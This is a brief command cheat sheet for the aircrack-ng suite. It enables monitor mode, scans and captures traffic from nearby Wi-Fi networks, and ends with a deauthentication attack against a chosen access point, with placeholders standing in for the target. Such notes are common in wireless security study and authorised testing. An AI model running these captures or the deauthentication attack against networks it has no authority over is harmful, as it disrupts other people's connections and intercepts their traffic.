# List of wireless network cards
airmon-ng

# Turn on "monitor mode" for wlan0
# airmon-ng will create a new network card named wlan0mon
airmon-ng start wlan0

# Scan and collect information from surrounding Wifi
airodump-ng wlan0mon

# Monitor and collect data from a specific Wi-Fi network
# Conditions: MAC address (BSSID) and operating channel (CH) are known
# Specify the MAC address of the Access Point you want to monitor
airodump-ng --bssid bssidVal -c channelVal -w random wlan0mon

# Deauthentication attack
aireplay-ng -0 5 -a bssidVal wlan0mon